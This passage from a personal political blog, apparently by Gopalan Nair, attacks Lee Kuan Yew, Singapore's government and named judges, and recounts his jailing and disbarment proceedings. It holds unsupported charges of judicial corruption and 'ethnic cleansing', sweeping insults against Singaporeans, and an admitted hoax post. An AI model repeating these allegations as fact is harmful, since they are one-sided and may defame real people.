subsidiary purchased the rights to a book by Deng Xiaoping's youngest daughter her father.\nNone of it worked. The Chinese figured that out.\nIt would be inimical \u2013 unthinkable -- for any government to order the divestment of any enterprise having to do with a free press, no matter how odious, and a lot of Murdoch's various media enterprises are odious in that they have interfered with the free and fair operation of democracy in at least three countries by scandalous and biased reporting designed to further his business interests. But maybe it is time for the heretofore toothless board of directors of News International to take a look at where he has got them. That is what boards of directors are for.\nThe boring spiritless, dull and compliant Singaporean.\nHave you wondered why a so called English educated people (now increasingly Mandarin educated), the inhabitants of the island of Singapore never make any news at all? Singaporeans does not have an All Blacks rugby team, not a single one is an adventurer, not one has challenged the ruing PAP or their government except today's Dr. Chee Soon Juan; in fact Singaporeans haven't done a thing that is noteworthy or something to speak about.\nSingapore does not have any leaders. Lee Kuan Yew's politicians are all hand picked bureaucrats who do what they are told, nothing more. As for the opposition, except for Chee Soon Juan, it too suffers from a total lack of leadership. James Gomez, the SDP's Australian resident has made his rounds during the recent elections, lost and just like the others, has totally disappeared. And while we thought, at least for a moment, that Dr. Chee's party the SDP was in fact a political party like what you see anywhere else, I am afraid it has returned to the one man show that it was before the elections. True, they have a blog and put out learned dissertations about matters of the world, but there may be only one man behind the whole thing, Dr. Chee himself. All the others have long gone, cleared out, after the elections.\nAs for Kenneth Jeyaretnam's party, the Reform Party, it is even worse. The entire party including it's boss, the late Jeyaretnam's son have gone into total hibernation.\nThe other party the NSP is even worse. Noone knows what has happened to them.\nThe one thing that this tells us is, that Singapore does not produce any leaders. There is noone there with any passion and the courage behind it to change society. It can only mean one thing, that Singaporeans on the whole are not people of any individual beliefs, no beliefs, no creativity, no passion, no nothing. Living under Lee Kuan Yew for this many years, it appears has completely destroyed their spirit, and made them into the lifeless humourless boring automatons that they are today.\nI believe the main reason for this sort of a life is because they no longer have any confidence in themselves. They fear Lee Kuan Yew and his government while at the same time they underestimate their own strength.\nWhen I was living in Singapore, and today while in the US, I had never had any respect for Lee Kuan Yew and his ilk. I feel, only a coward feels it necessary to punish his critics like Lee Kuan Yew does and noone respects a coward. Which is why, while in Singapore I openly joined the opposition, openly contested elections, which of course attracted his cowardly vindictiveness.\nHaving come to the USA for a better life, which by the way is infinitely better than anything in Singapore, I continue to provoke Lee Kuan Yew and his friends there to embark on even more stupidity to silence me, one of which is the impending proceedings to have me disbarred in that island.\nHad I been in Singapore and not left, I can assure you I would be doing the same thing in Singapore, and being arrested again and again for it, which as you know would hurt him and his friends much more than it ever would me.\nI am sure noone can call me a dull boring spiritless character, but frankly, I am no different from anyone else in the rest of the world, only that compared to the ordinary Singaporean, I am world's apart.\nJust look at it, the Arab spring has come and gone except for Syria, but Singapore's Lee Kuan Yew continues to pay himself several millions of dollars belonging to you, but you have done nothing. He continues to deny your rights but you continue to stand there and do nothing.\nIn fact, in recent history, I have been fighting for the cause of Singapore's freedom much more than any one of you Singaporeans have, even though I am not even officially Singaporean but American. In 2008 I got arrested for speaking my mind in this blog against Judge Belinda Ang Saw Ean's corrupt practices in court, and went to jail. After returning to the US I continued my criticism resulting in their commencing disciplinary proceedings against me to have me disbarred from practicing law in Singapore, which will be heard in the Singapore High Court on July 25, 2011, this Monday. Also I wrote a hoax blog post on the serious illness of Lee Kuan Yew to test Singapore's resilience as a state, for which they had to criticize me in the island's Parliament. I have told them that my criticisms will continue even after my disbarment from the Singapore courts. This defiance by me is making them fuming mad.\nI want to tell Singaporeans this once again. Lee Kuan Yew and his friends who rule over you are nothing. If you did challenge him, he would probably throw you in jail. But the moment you hold your ground and remained defiant, he will back off as he always does, just like any other coward behaves.\nThere is no point in coming back in the year 2016 and make speeches at election rallies because noone will respect you. They would if you agitate now, through public protests and civil disobedience because for the first time, Lee and Company would have to pay attention. Otherwise there is going to be nothing but the same old boring existences that you are very accustomed to.\nEthnic cleansing, Singapore style\nSingapore's Constitution clearly mandates equality of religion, and races in the island. But Singapore strongman Lee Kuan Yew, just as he ignores any law as he pleases, blatantly ignores the Constitution, and deliberately and systematically diminishes the population of Malays, Indians and other races while continually increasing the Chinese population, his preferred race, within the island, he himself being of Chinese descent.\nThis long standing policy of ethnic cleansing against the Malays and Indians has gone on for so long that they are now very small minorities within the island and if Lee Kuan Yew's determination to eliminate the Malays and Indians goes on unchecked, before long there won't be any minorities left in the island, and it would be entirely Chinese.\nIn the 1930s and earlier, when my father first settled in Singapore from his native India, the Chinese in Singapore only formed about 50% of the population, the other 50% being made up almost equally between the Malays, who were there before anyone else, the Indians and Eurasians.\nAlthough the Chinese population had increased with an increase in childbirth over the years, so did the Malays and Indians. But for decades now, the Chinese fertility rate has dropped to less than even the replacement level, while the Malays and to a lesser extent, the Indians reproduction rate were proportionately greater. Therefore if things were left as they were, the Malay population and the Indian would have increased further while the Chinese population would have shrunk.\nBut whether the Chinese or Malay or Indian population increases at a faster or slower rate is something which has to be left alone, as they are all Singapore citizens and no particular race should have an advantage over the rest. Of course that is what we would expect in a free and fair democracy with the rule of law, but Singapore is not a democracy but a dictatorship with Lee Kuan Yew strutting around giving the orders.\nIf you did not know already, this is what has been happening for decades. Lee Kuan Yew's government has plucked out a number from thin air and declared that whether anyone likes it or not, Singapore's population should henceforth always comprise 75% ethnic Chinese, some 15% Malays and the rest Indian.\nSo since the Chinese are not producing babies fast enough to maintain their 75% majority, what do he do? You guessed it. Lee's government brings in shiploads of ethnic Chinese from Communist China to boost their population. And that is why anyone going to Singapore sees only Chinese faces, because most of them are recent imports from China, thanks to Lee Kuan Yew's policy of ethnic cleansing.\nHad this happened in any other country in the world, the Malays and Indians would have been up in arms and there would have been island wide riots and mayhem. But Lee Kuan Yew has managed to keep every single Singaporean in so much fear of him that the Malays and Indians appear unwilling to complain at all, and stand idly by while their population disappears entirely while Chinese Singapore, like an eclipse in progress, completely turns Singapore into a rouge Chinese port as Gough Whitlam of Australia had called it not too long ago.\nAnd I want this to be a stark reminder to every single Malay and Indian in Singapore. Your Singapore as your home, is going to disappear. In fact it is being pulled out under your very noses for the last 20 years or so and the Lee Kuan Yew family, a family that has no respect for the rule of law has been responsible for this disaster.\nMy job here is merely to alert the world as to what is happening. It is the Singaporean Malay and Singaporean Indian upon whose shoulders the responsibility to stop this slide into oblivion lies.\nSingapore Malays should work with their Malaysian brothers, shoulder to shoulder to campaign against this, and so should the Singaporean Indian with the help of the Tamil Nadu government and do the same.\nThese reports that I write greatly angers the Singapore government of course, but I can assure you they will continue while I hope it has stirred your emotions and your indignation to do something real to stop the rot.\nAnd it has been a pleasure for me to write about it.\nSingapore. Living in fear stunts achievement\nEveryone in Lee Kuan Yew's Singapore knows where he stands. Lee and his government are boss. The citizen on the other hand is expected to know his place. And this inferiority stifles progress, stifles achievement or spontaneity; where every action is calculated and checked to see to it that Lee is not displeased.\nFor one, the Singapore courts are not there to serve the people. Most legal work in the island happens in the Subordinate Court, where people are arrested charged and punished in busloads for breaking Lee Kuan Yew's laws.\nCivil law on the other hand is almost non existent. The High Court in Singapore is almost a ghost house where there are hardly any cases, and if any case was ever heard there, it has to be some millionaire woman or other suing her doctor for $60 million for a botched medical procedure. It is as you guessed, primarily the forum for the rich and connected and usually the one who is more connected wins over the less connected.\nThere are several reasons for the law being almost beyond the reach of the lesser ordinary citizen whom Lee has called mere \"digits\". For one you almost need to be a millionaire to bring a law suit there, where filing fees and court fees run into several thousand dollars each day. Then there is the English practice where the loser has to pay the winner legal costs, which again will run into several thousands of dollars, making litigation a very risky proposition, especially when Lee Kuan Yew controls his judges.\nAnd third, there are really no laws to speak of when it comes to administrative injustices. For instance, the state controlled Housing Agency, the HDB, in whose apartments almost every single Singaporean lives does not really have any grievance procedure. If you were unjustly passed over for an apartment which was given to a Lee Kuan Yew cronie, there is nothing much you can do. You can write a letter of complaint if you want, but there is nothing else you could do if it ended up in the thrash can, other than banging your head against the wall.\nIt is the same as far as grievances against any state agency. The idea is, take it or leave it. It is simply, Lee Kuan Yew's rules in Lee Kuan Yew's island. He builds the apartments with your money and lets you take a flat of his choosing. Either take it or leave it. Most importantly shut your trap and behave.\nAnd this philosophy of my way or the highway runs across his entire government. There are many who suffer silently from injustices suffered from the Department of Motor Vehicles, the Department of Health and every other government agency you can think of. It really does not matter to his government whether any individuals rights have been violated or anyone has been unjustly discriminated. Lee's idea appears to be that he has a system of government set up where the average citizen is provided with the bare minimum of housing and bare minimum of essentials to survive. And that is as far as it goes.\nAnd the ones who make decisions as to what you should have and what you should not are Lee Kuan Yew's chosen elite. These are the government scholars, given government scholarships abroad who return to serve his government. These are the ones who literally decide how you should live, what apartments to build and how many, and how much taxes you should pay.\nThe difficulty of using Lee Kuan Yew's courts is not because of chance, it is by design. Lee does not want an atmosphere where you feel you have any individual rights, because it tends to weaken his ability to rule. A population that feels helpless is much more readily controlled, instead of one which thinks they have rights. In Lee's Singapore, if someone feels they have been unjustly treated, the proper thing to do is to stand in line outside your Member of Parliament's office (which happens to be a member of Lee's government) and beg for help. If you are lucky, you will get it, if not hard luck. The idea is to instill in you the realization that you are nothing, Lee Kuan Yew and his government is everything.\nAnd I was going to say, this sort of a controlled life lived in fear of Lee Kuan Yew and what he could do to you if you crossed him, produces a type of second rate individual who never achieved any success. The reasons are many. Firstly the average Singaporean unlike Lee Kuan Yew's elite feels neglected and ignored, which makes him bitter and hate his government. He realises he is nothing but dirt, in Lee Kuan Yew's Singapore where his chosen few live like Gods. They live lives of luxury and security, protected by Lee Kuan Yew and his government. He on the other hand is nothing but a \"digit\".\nIn an unjust scenario such as this, he has nothing to look forward to. His country has neglected him and he has no concern for his country. All his life is spent just keeping his job, making sure that he does not trample on any one's toes and to continue the remainder of his life as peacefully as possible. In his life there is no challenge, no purpose but just a dull existence, not only for him but also for his family, keeping clear of Lee Kuan Yew and what he can do to you.\nAn existence such as this never achieved greatness, never achieved spontaneity nor any geniuses. It simply will not where the average Singaporean has no interest whatsoever in his country and his country has no interest whatsoever in him.\nIn the US it is very different. The laws in the US not only exist in the books, it is actively exercised. There are grievance procedures set up in every department. If you are denied a drivers license, you have a grievance procedure to help you. Denied housing? There is a grievance procedure for this too. Every single infringement of your rights allows you to challenge it. And if there was still no satisfaction, you have legal redress in court before an impartial judge who delivers justice regardless of whether Obama likes it or not.\nAnd it is not just the avenues of justice available, we make sure it is readily and cheaply available to everyone. The court filing fee for an entire law suit in the Superior Court of California costs no more than about $300.00. And we don't have the practice of making the loser pay the winner's costs of litigation, which therefore reduces the uncertainty of huge losses just for suing someone.\nEvery single tribunal in California is full of litigants of one sort or another, all seeking justice where they feel denied. And every single citizen lives his life, free and with the firm belief that this is a country of laws and his rights would always be protected.\nAnd that is why America continues to be the most attractive country in the world where the whole world wants to come and live, a place which continues to produce greatness and where the people respect their government as their government respects them, not just the rich and connected but even the lowest of the low.\nToday the US is one of the few among the developed countries of the world whose population is increasing and not decreasing, like that of Lee Kuan Yew's Singapore. And that should be no surprise to anyone.\nLee should realize that merely writing in his state controlled press that Singaporeans are happy is not enough. They should really be happy.\nSingapore's Lee Kuan Yew makes you a deal, you simply cannot accept.\nIf you live in Singapore or if you are found within Singapore, this is what Lee Kuan Yew's deal is for you. If you ever criticize him, his courts or his government, he will use the law any way he wants to silence you. Although you are on the receiving end of his abuse and misuse of the law, you are supposed to quietly accept it. If ever you dare to criticize his actions, or those of his judges, he will sue you or charge you and send you to jail or even better, order you to pay thousands or millions and if you did not, bankrupt you.\nFor Lee Kuan Yew, his judges who are his principle weapon to remain in power. If you try to discredit his judges, you are attacking his principal weapon against his opponents and therefore it simply will not be tolerated, as his power stands in grave danger of being weakened.\nEvery single Singaporean lives under this ever present fear. That is why no matter how much Lee Kuan Yew's judges misuse the law, there is really noone willing to stand up and criticize them.\nRecently Alan Shadrake was sent to jail for writing a book critical of Lee Kuan Yew's judges for being lenient towards those with power and not against ordinary Singaporeans without connections in high places.\nEven though Lee's Judge Belinda Ang Saw Ean shamelessly abused her power as a judge in punishing Chee Soon Juan in his 2008 defamation actiion brought by Lee Kuan Yew, not a single Singaporean so far has had the courage to condemn her actions. That is what I did in this blog which resulted in my having to go to jail for 3 months in Singapore. Now they are going to disbar me for refusing to stop criticizing her for her shameful dishonesty and that of his other judges.\nSingaporeans on the other hand live their lives in fear of Lee Kuan Yew perhaps because they have nowhere to go and would rather not go to jail in Singapore.\nBut for others such as me, Lee Kuan Yew's offer is one which I simply cannot accept. While his government and his judges continue to deny the rights of his citizens, I will continue to condemn him and his corrupt kangaroo judiciary. That is something I think he understands by now.\nPosted by Gopalan Nair at 11:07 PM 1 comment:\nLaw Society of Singapore vs Gopalan Nair, trial date July 25, 2011. A brief rehash of what it's about.\nSingapore's Law Society's case against me to have me disbarred from practicing law in Singapore will be heard in Singapore High Court on July 25, 2011. Although I have stated here the details of the case, I am going to give you a brief reminder once again. I don't intend to waste your time on this Singaporean nonsense.\nThe first charge is for writing a blog post here on May 29, 2008 criticising Judge Belinda Ang Saw Ean for misusing the law as a judge to punish the well known Lee Kuan Yew critic Dr. Chee Soon Juan.\nI am reproducing the blog post below. The government takes umbrage to the words in the blog \"The judge Belinda Ang was throughout prostituting herself during the entire proceedings, by being nothing more than an employee of Mr. Lee Kuan Yew and his son and carrying out their orders\".\nThe government claims that I insulted the judge by the aforesaid words that she had prostituted herself as a judge. However every English language dictionary defines the words \"prostituting oneself\" as one who dishonestly misuses her authority. In this case the words were accurate to describe what she did. There was no insult at all. I have my freedom of speech.\nSingapore. Judge Belinda Ang's Kangaroo Court\nThis is Gopalan Nair in Singapore today, May 29, 2008. I have been in Singapore since May 25, 2008, and staying now at Broadway Hotel, Room 708, 195 Serangoon Road, Singapore 218067.\nI am deliberately stating my identity and my present exact location for a definite purpose. On day 2 of the trial in Singapore, day before yesterday, in the Lee Kuan Yew and son verses Dr. Chee Soon Juan case, Lee senior had said in answer to a question by Dr. Chee, that if he, Lee Kuan Yew, knew the identity of bloggers in cyberspace who defamed him (defamation being used of course in the Singaporean sense), he will sue and bankrupt them.\nHe had earlier sidestepped the question by saying, that he had difficulty suing critics of his in the Internet because their identities were not usually known. When pressed, he categorically and deliberately stated that he will sue if they made known their identities.\nWell, what you are going to read should be without question defamatory of Mr. Lee and his son, that is in the warped and hare brained Alice in Wonderland meaning of the word \"defamation\". It will be interesting to see if this Singapore strongman, Lee Kuan Yew and son, who strut around the small island of Singapore bullying everyone who so much as criticized, will sue me now for calling him nothing more than a small time street bully; since now, we have myself Gopalan Nair who has the temerity to identify himself and state his presence with full address in Singapore.\nMr. Lee Kuan Yew, see here. I am now within the jurisdiction of your courts; I repeat, \"the jurisdiction of your courts\" because literally they are your courts, willing to commit any crime or injustice you will demand of them.\nDuring the last 3 days of the court hearing, up till yesterday, in the High Court, before your stooge of a judge, Belinda Ang in Court 4, you and your Prime Minister son conducted yourselves as expected, no better than cowards hiding behind the coat tails of your equally cowardly counsel doubling up as a PAP politician in court; who managed with the full co-operation of the said judge to ensure that you came to court merely for form, refusing to answer almost all questions that went directly to your integrity or rather the lack of it.\nAfter the end of the 3 days in court, it left no doubt in my mind that you and your son are indeed what international human rights organizations say you are, nothing more than tin pot tyrants who remain in power by abusing the courts to eliminate your political opponents. You are clearly corrupt, as is your government, because paying yourself $3.7 million is corruption pure and simple and in the end you have lost all credibility and moral authority to govern Singapore.\nThe following transpired during the last 3 days in court. The judge Belinda Ang was throughout prostituting herself during the entire proceedings, by being nothing more than an employee of Mr. Lee Kuan Yew and his son and carrying out their orders. There was murder, the rule of law being the repeated victim.\nThe issue in the said court was the determination of the quantum of damages payable by the innocent victim, Dr. Chee Soon Juan who had earlier been found liable by this judge for defamation of character of Mr. Lee and son, where the law was once again abused through the contrivance of a process known as summary proceedings, thereby disallowing Dr. Chee to produce any witnesses or to cross-examine those of Mr. Lee because there were none.\nThe said 3 day of hearing before the court was nothing more than a mockery of justice; a charade, a make believe that appeared right out of the pages of Alice in Wonderland with Belinda Ang playing the role of the Queen of Hearts before the trial of the Mouse who stole the Tarts very well indeed. It almost appeared that she was going to dispense with all testimony and come straight to the verdict of guilty so as not to waste her valuable time!\nIt would be fair to say, in fact an understatement, that in effect she disallowed Dr. Chee any effective cross examination of either the father Lee Kuan Yew or the son, as Mr. Singh, their counsel was almost having a workout like in a gym; standing up to object, and sitting down after almost each and every question that Dr. Chee put to his father and son clients. In fact Singh was popping up and down almost without let up during the several hours of the hearing so much so, that someone suggested to me that it would have been a good idea if he remained standing throughout the case to facilitate his expected objections at each and every question of Dr. Chee.\nIf Dr. Chee did manage to ask even one question, it was because he went ahead and asked it despite the objection of both Mr. Singh and the judge because if he did not, he would not have been able to ask any questions at all!\nDr. Chee has asked Lee's son how much he was being paid, that is $3.7 million, 6 times what George Bush is paid! Question disallowed and the son shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks whether it is just for him to corruptly steal this amount of taxpayer's money while the poor in the 1 room flats starve without any financial assistance! Question disallowed and the son shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks why the GIC and HDB function under a shroud of secrecy without any transparency, when the moneys in them is taxpayers money? Question disallowed and the son shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks whether he knew that those who read the Internet overwhelmingly hated him as a tyrant and a bully and the only ones singing praises in his name are the Singapore state owned and controlled media? Question disallowed and the son shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks whether the international community looks at him no better than a despot and a father's son? Question disallowed and the son shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee had asked this Lee Kuan Yew's son why he said in the 2006 elections that \" if there were more opposition candidates at elections, he will have to \"fix\" them and bribe his voters to win elections\"? Question disallowed and the son shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nThere were many more questions put to him just as the above questions, all very relevant, which, had they been answered, would have shown that he had no integrity or reputation whatsoever, and since integrity and reputation are the issues in deciding quantum of damages, Lee Kuan Yew's son should have been awarded no damages at all; that is provided we have an independent judiciary, which we have not.\nAny honest spectator in the court's gallery would have come away with one opinion alone, that is, this man is Prime Minister only because he happens to be the son of his father. If he really wanted to show that he was in fact in control, he could have easily told his lawyer to stop being the Jack in the Box and stop popping up and down with his objections and let him handle the questions. At each question, he was looking meekly at his counsel to see whether he has to answer it. If I could put it in a simple way, he was nothing more than a helpless boy.\nThe following refer to Lee Kuan Yew's testimony or rather the lack of it.\nChee asked him whether he came to power through unfair means in 1959, as shown by declassified British Colonial Office documents in London? Question disallowed and the father shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks about his throwing Lim Chin Siong, his political compatriot, in jail under the ISA in solitary confinement for several years in the 1960s and whether this was a sign of a man with a reputation and integrity? Question disallowed and the father shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks about the Operation Cold Store in the 1960s where he jails political opponents because he fears he might be overthrown? Question disallowed and the father shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks about Chia Thye Poh, Zaid Zakaharia and Lim Hock Siew, his political opponents whom he imprisons without cause for many many years? Question disallowed and the father shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nChee asks whether the only people who have a good opinion of him are his state owned and controlled Singapore press, whereas everyone else in Singapore as well as the entire list of respectable foreign organizations and countries including the entire European Union consider him as a thug and small time street bully? Question disallowed and the father shamefully just sits there, protected by his counsel Mr. Singh and the kangaroo judge.\nOther than the dubious Transparency International Kula Lumpur Chapter (not to be confused with Transparency International of Berlin Germany) he was asked whether anyone else considered him in high regard other than the local press which he controls? His answer was that PERC and a Swiss organization, both of whom cater for businessmen thought highly of him. But when asked whether highly respected Amnesty International, Human Rights Watch, Lawyers Without Borders, Reporters without Borders, ILRW and several other international bodies considered him a crook; he had nothing to say, because as usual the Jack Rabbit Davinder Singh stood up once again to object and the judge obediently sustained the objection.\nThen Lee Kuan Yew went on to insult Dr. Chee with impunity, that he is a liar, a cheat a charlatan, a criminal and what not. Of course the judge permitted these insults, since after all Lee Kuan Yew and his son owned the courts and the judge as well.\nThese court proceeding were nothing more than a sham, a charade and a mockery of justice. It was very clear that both father and son had no integrity or credibility whatsoever. They were ruling Singapore through fear and those who are able to leave the country leave it in droves, only to be replaced by Mandarin speaking immigrants from the Peoples Republic of China who speak no English at all.\nIf there was one result of these proceedings it was this. Dr. Chee' impeccable reputation was vindicated. He came out of these proceedings truly as the statesman that he is, and he demolished these two petty thugs Lee and his son, perhaps not in this Singapore kangaroo court, but truly in the court of truth and conscience.\nAnd in fact despite the objection of Mr. Singh and Belinda Ang, Dr. Chee Soon Juan did manage to say to both father and son, that regardless of what the court decides, in the court of natural justice, in the court of truth and in the court of moral conscience, they had that day lost all moral authority to govern Singapore.\nI believe, not only me, but every single person who walked away from that courthouse yesterday came away with that same judgment.\nAs the Lees know, I am a lawyer practicing in Fremont California and a member of the California Bar. My question to Lee Kuan Yew and his son is this. Are you going to stand by your threat and sue me for defamation as well? I am presently physically within your jurisdiction and the jurisdiction of your kangaroo courts. Are you going to going to send your process server to me with your writ of summons? Or are you, as expected, all talk and no action, when you meet those not afraid of you, just as how a petty street thug would behave?\nBroadway Hotel,\nSerangoon Road, Singaproe\nThe second and third charges refers to an incident on July 4th 2008 along Race Course Road and Bukit Timah Road junction near Little India Singapore. Some people in civilian clothes accosted me and accused me of knocking on a Singapore police car which was some 300 feet away from where I was. I refused to co-operate with them when they used forced to pin me to the ground, causing me injuries and and handcuffed me. I was charged with using bad language against them and shouting at them and behaving in an unruly fashion, all of which I have denied. Even if I did all of the above, which I did not, no lawyer should be disbarred from practicing law for this.\nThe fourth charge deals with what happened at my trial for the above yelling at policemen case. During the case, I had told the judge, something to the effect that I had no respect for the judge nor the court, because it was entirely politically motivated and that I am being charged just because I am a critic of Lee Kuan Yew and his Singapore dictatorship. I had made a number of statements in court to this effect. To backtrack, as regards the first Belinda Ang Saw Ean charge, I was sent to jail for 3 months in September 2008. One week before I was to be released, which was supposed to be on November 26, 2008, I was taken to court once again from prison and this time charged for contempt of court for making these statements at my \"yelling at policemen\" trial. If I denied the charge and went to trial, it was almost certain that I would have to spend more time in jail. As my law practice was being neglected very badly in California, I had to go home to USA soon. So to avoid the danger of this I pleaded guilty. As a condition of their not extending my jail term further I had agreed to take down 2 other blog posts which referred to the \"yelling at policemen\" trial, apologized and promised not to attack Lee Kuan Yew's Singapore or their judges anymore. The moment I returned to the US, I wrote in this blog that I refuse to apologize, put up those 2 blog posts that were taken down and continued my criticism of Lee Kuan Yew, his dictatorship and their boot licking judges. For doing this I am being charged in these proceedings.\nThe fifth charge deals with a blog post here which I wrote about Singapore judge Judith Prakash for sending 3 men to jail merely because they wore Tshirts with the picture of a Kangaroo in judge's robes. They were seen and arrested by the police outside Judge Belinda Ang Saw Ean's court in the 2008 defamation trial against Dr. Chee Soon Juan. They are charging me for using the same \"prostituting \" comment against this judge. These words were a correct use of the English language as the Judge was clearly being dishonest and misusing her authority by sending the men to jail merely for wearing Kangaroo pictured T shirts. I am appending the case below again for your reading.\nJustice Judith Prakash. Another Kangaroo Judge.\nAfter my imprisonment in Singapore for 60 days, thanks to Singapore's Lee Kuan Yew, I was let off for 5 days so as to get my things in order before I was banished forever from Singapore on November 26, 2008. The 5 days enabled me to attend the case in the High Court, generally known as the Kangaroo Court T shirt case. On Monday 24, 2008, the Singapore judge Justice Judith Prakash found all 3 defendants guilty as expected. The sentence was to be delivered on Thursday November 27, 2008 which I could not observe, as I was deported on Wednesday the 26th. There was jail terms for all 3 Defendants, with Mr. Tan having to serve 15 days, and the other 2 Isrizal and Shafi, 7 days each. In addition they were each ordered to pay the government costs of $5,000.00 each.\nThe facts are that these 3 wore T shirts with the image of a kangaroo in judicial robes, (which means that the court is not impartial but corrupt), to the hearing before Justice Belinda Ang, (which by the way, was the same judge whom I was accused of insulting, resulting in my 3 month imprisonment), from May 26 to May 28 2008 at the Supreme Court Singapore. As you will recall, the case before Judge Ang was for assessment of damages that Dr. Chee and company have to pay Lee Kuan Yew in his successful defamation action brought by Lee against Dr. Chee. For wearing these T shirts to Judge Ang's court, Justice Prakash found them all guilty and the resultant severe penalties.\nNone of the 3 deserved any punishment. The Singapore constitution allows every citizen the freedom of speech and expression. And wearing T shirts with the image of a Kangaroo is the exercise of that freedom which the Constitution guarantees. Secondly it cannot amount to a contempt to say something which is true.\nEveryone knows that the Singapore judiciary is complaint to the wishes of Lee Kuan Yew and his government as can be seen from the series of politically motivated court cases from as early as the 1960s up till today against the late JB Jeyaretnam to Dr. Chee Soon Juan, Lee's victims, who have been imprisoned and impoverished. How then can saying something that is true, that the Singapore courts are kangaroo courts and Singapore judges' kangaroo judges, amount to contempt of court?\nJustice Judith Prakash just as all her fellow judges in Singapore has once again disgraced herself, her office as judge and let down Singapore by shamelessly doing the bidding of her master Lee Kuan Yew by convicting and punishing these brave young men, who are in fact the pride of Singapore. They unlike the masses who live in fear of Lee Kuan Yew, had the courage to speak the truth and do what had to be done, which is to stand up to their convictions and say what has to be said, come what may.\nThese politically motivated cases, intended to break the will of good upstanding men and women of Singapore is difficult to endure. The jail terms of 15 days and 7 days is bad enough but endurable. But what is crippling is not the jail terms. It is the court costs of $5,000.00 (about US$4,000.00) each that they have to pay. This is a huge crippling amount of money for an average wage earner in Singapore.\nIf they find the money to pay, it will be a lesson to them never to criticize Lee's courts again. On the other hand, if they cannot pay, they would be made bankrupt, which means they cannot travel outside Singapore and the requirement that they report each month to the Bankruptcy office to explain their financial standing. Either way it is a debilitating crippling punishment, intended to send a clear signal both to them and everyone else that they should not, ever, dare to criticize Lee Kuan Yew or his courts, regardless of whatever dishonesty he or his courts perpetrate.\nAnd if they ever do what they did again, they will be sent to jail for longer periods as well as suffer even heavier financial burdens.\nWith Lee Kuan Yew abusing the law courts to stay in power, and with unprincipled shameless judges such as Judith Prakash, what then is the answer to make this fascist dictatorship of Lee Kuan Yew accountable to the people? It is easy for me to say from the safety of the United States that more and more Singaporeans should pick up the courage that these 3 admirable young patriots had, and do what is right.\nBut that is easier said than done. During my 6 months forced stay in Singapore, with my passport held by Singapore police, waiting for my trial 4 months later, I had ample time to meet many Singaporeans. Each time I told Singaporeans to stand up to this dictatorship by open protest, I have always been faced with the same expected answer.\nThey tell me that they are all ready to speak up against the dictatorship, but they cannot because they would lose their jobs and their children would suffer; they and their families would be ruined financially at the hands of these corrupt compliant judges. This, you would well see, is a hopeless situation, forcing them to suffer in silence in fear of Lee Kuan Yew and his courts.\nI do not have an answer to this question. Dr. Chee Soon Juan and his sister Chee Siok Chin have paid gravely to stand up to their convictions. Dr. Chee has lost everything and so has his sister. In history, there are only a handful of men like Dr. Chee, like Nelson Mandela and Gandhi. It is unreasonable to expect ordinary people to be martyrs like them.\nLee Kuan Yew as you can see has a grip on power. And his principle instrument to stay in power is his law courts with his compliant judges which he uses to destroy and demolish his opponents, by bending and breaking the law outright when necessary.\nBut I know certain truths painful about the country. One is that it is imposable to change this government through parliamentary elections. The Singapore Parliament is nothing more than a rubber stamp. As Christopher Lingle, the NUS professor who was charged with contempt of court and managed to flee the country had written, \"Singapore is a one party Leninist state\".\nAlthough outwardly Lee Kuan Yew portrays Singapore as a Parliamentary democracy, nothing is further from the truth. It is Lee Kuan Yew, the 86 year old dictator who controls everything, the courts, the trade unions, the media, everything. Parliament has no powers at all. Members of Parliament are mere stooges who would be quite prepared to say 2 plus 2 is 27 or any number Lee Kuan Yew wishes, to take the example of Orwell's 1984.\nTherefore the only way to change this government and to make it accountable is for people to be able to say that 2 and 2 are 4 and not any other number of Lee's choosing. And the way to do this is not through the elections of 2010, the next general elections in Singapore, but through peaceful protest on the street.\nBut peaceful protest means unbearable hardship to the protestors. It would mean 15 days jail and $5,000.00 court costs liability, if not more, to take the recent example of the Kangaroo T shirt case.\nWith the crippling and terminal nature of these punishments, who among Singaporeans will be prepared to embark on this dangerous adventure? George Orwell in 1984, said correctly that the proletariat will not be the ones with the daring to do it; because they do not understand the need for such abstract values such as freedom and democracy, being content with the hope of getting a an extra $1,000.00 in pay or a better TV set. Neither will members of the elite with the knowledge of such values as freedom; the Inner or Outer Party in his novel 1984, be prepared for that sacrifice, as they would have too much to lose financially.\nThe answer lies with the young men and women with a tertiary education, citizens who are armed with a good English education, who know that they can succeed anywhere in the world, who would care 2 hoots to what Lee Kuan Yew can do to them. If they protest and get arrested, so what? They can take the next flight out to Australia where they will be welcomed with open arms, where they and their families can live as free men and women, able to speak their minds without fear of Lee Kuan Yew or anyone else.\nIt is these young men and women who should take courage and join Dr. Chee Soon Juan and his noble fight to seek freedom for his people. And I call upon them not to remain silent and do what is right and noble. Stand up for Singapore and stand up for the truth. You have nothing to lose and everything to gain.\nLeaving Singapore for a life overseas is itself the greatest form of protest against Lee Kuan Yew and his politically motivated courts. In effect, by leaving, you are telling Lee Kuan Yew that you are not prepared to live as a slave in his island and the ability to live a free man is worth more than any amount of riches that corrupt judges such as Judge Judith Prakash can earn in her entire lifetime by playing second fiddle to Lee Kuan Yew, her master.\nAt present, I understand that as many as 1000 Singaporeans emigrate from Singapore's shores annually for countries such as Australia. I have read that Lee Kuan Yew himself has gone to cities such as Melbourne begging overseas Singaporeans to return with no success whatsoever. Why should they return to a fear infested island where the slightest criticism of Lee or his courts will result in crippling financial ruin! By the way, I understand that the numbers of those leaving has been steadily increasing above 1000 each year!\nAs for the likes of Justice Judith Prakash, she will continue to live her life in luxury for the dirty work she does to please her master Lee Kuan Yew. Her income for being an agent for Lee Kuan Yew to silence and destroy his critics, I understand is several millions of dollars a year.\nBut I am sure that she loathes each time that she has to look at herself in the mirror, because what she sees is the face of a dishonorable unconscionable and unprincipled human being who lives by prostituting her position as a judge to please her master Lee Kuan Yew, who finds no other way to stay in power other than abusing the law to silence his critics.\nMay I say the same thing that I said about her fellow Singapore judge, Judge Belinda Ang, which landed me in 